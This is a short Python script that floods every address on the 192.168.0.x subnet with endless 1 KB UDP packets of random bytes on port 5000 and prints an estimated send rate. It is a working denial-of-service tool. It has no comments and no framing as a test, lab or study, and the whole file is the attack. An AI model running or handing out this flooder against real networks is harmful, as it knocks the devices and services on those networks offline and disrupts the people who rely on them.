import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)

bytes_data = random._urandom(1024)

network_prefix = "192.168.0"
port = 5000

target_ips = [f"{network_prefix}.{host_num}" for host_num in range(1, 255)]

sent = 0
ip_index = 0
start_time = time.time()

while True:
    ip = target_ips[ip_index]
    try:
        sock.sendto(bytes_data, (ip, port))
        sent += 1
    except OSError:
        pass

    ip_index = (ip_index + 1) % len(target_ips)

    if sent % 10000 == 0:
        elapsed = time.time() - start_time
        mbps = (sent * 1024 * 8) / (elapsed * 1_000_000)
        print(f"Sent: {sent} packets, Approx speed: {mbps:.2f} Mbps")
